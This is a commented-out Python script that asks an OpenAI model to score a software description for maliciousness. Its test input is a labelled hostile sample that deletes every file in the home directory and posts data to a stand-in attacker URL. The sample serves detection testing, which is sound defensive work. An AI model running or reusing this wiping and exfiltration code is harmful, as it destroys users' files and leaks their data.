# import openai
# import CONSTANTS

# # Replace with your OpenAI API key
# openai.api_key = CONSTANTS.api_key

# def detect_malicious_software(description):
#     response = openai.Completion.create(
#         engine="gpt-3.5-turbo-instruct",
#         prompt=f"Analyze the following software description and determine if it is potentially malicious or toxic to a computer system. Provide a detailed analysis:\n\nDescription: \"{description}\"\n\nAnalysis with threat score on the scale 1-10:",
#         max_tokens=150
#     )
    
#     return response.choices[0].text.strip()

# description = """
# import os import requests def delete_files(): # WARNING: This code deletes all files in the home directory home_dir = os.path.expanduser("~") for root, dirs, files in os.walk(home_dir): for file in files: os.remove(os.path.join(root, file)) def send_data(): # WARNING: This code sends sensitive data to an external server sensitive_data = "This is sensitive data." url = "http://malicious-server.com/upload" requests.post(url, data={"data": sensitive_data}) if __name__ == "__main__": delete_files() send_data()
# """

# malicious_software_analysis = detect_malicious_software(description)
# print(malicious_software_analysis)
